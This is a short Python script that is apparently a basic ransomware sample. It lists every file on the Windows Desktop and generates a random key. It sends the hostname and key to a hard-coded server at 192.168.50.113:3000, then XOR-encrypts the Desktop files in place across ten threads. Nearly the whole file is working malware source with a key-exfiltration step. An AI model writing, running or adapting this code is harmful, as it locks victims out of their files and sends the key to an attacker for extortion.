import socket 
import os
import threading
import queue
import random

def encryption(key):
    while True:
        file = q.get()
        print(f"Encrypting {file}")
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f"{file} encrypted successfully")
        except Exception as e:
            print(f"Failed to encrypt file due to {e}")

IP_ADDRESS = '192.168.50.113'
PORT = 3000
ENCRYPTION_LEVEL = 512 // 8
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;[]{}|'
key_length = len(key_char_pool)
hostname = os.getenv("COMPUTERNAME")

# Navigate directory to encrypt all the files
print("Gathering files....")
desktop_path = os.environ["USERPROFILE"]+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f"{desktop_path}\\{f}") and f != __file__[:-2]+'exe':
        abs_files.append(f"{desktop_path}\\{f}") 
print("All files located")

# Generate encryption key
key = ''
for i in range(ENCRYPTION_LEVEL):
    key += key_char_pool[random.randint(0, key_length-1)]
print("Generated key")

# Server connection to transfer key and hostname
print("Attempting to connect to server...")
try:   
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:        
        s.connect((IP_ADDRESS, PORT))
        print("Successfully connected, transmitting data")
        s.send(f"HOSTNAME: {hostname}]\nENCRYPTION_KEY: {key}".encode('utf-8'))
        print("Data sent")
        s.close()
except Exception as e:
    print(f"Failed to connect due to {e}")

# Store files into queue for multi-thread encryption handling
q = queue.Queue()
for f in abs_files:
    q.put(f)

for i in range(10):
    t = threading.Thread(target=encryption, args=(key,), daemon=True)
    t.start()

q.join()
print("Encryption & Upload completed")
input()